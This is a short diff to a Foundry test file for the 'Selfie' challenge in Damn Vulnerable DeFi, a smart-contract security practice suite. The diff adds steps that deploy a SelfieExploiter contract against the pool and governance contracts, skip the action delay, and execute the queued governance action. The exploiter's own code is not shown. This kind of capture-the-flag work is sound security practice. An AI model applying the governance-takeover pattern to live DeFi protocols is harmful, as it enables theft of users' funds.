@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfieExploiter} from "./SelfieExploiter.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -63,6 +64,12 @@ contract SelfieChallenge is Test {
      */
     function test_selfie() public checkSolvedByPlayer {
         
+        SelfieExploiter exploiter = new SelfieExploiter(pool, governance, recovery);
+        exploiter.exploit();
+
+        // Skip the action delay
+        skip(3 days);
+        governance.executeAction(1);
     }
 
     /**
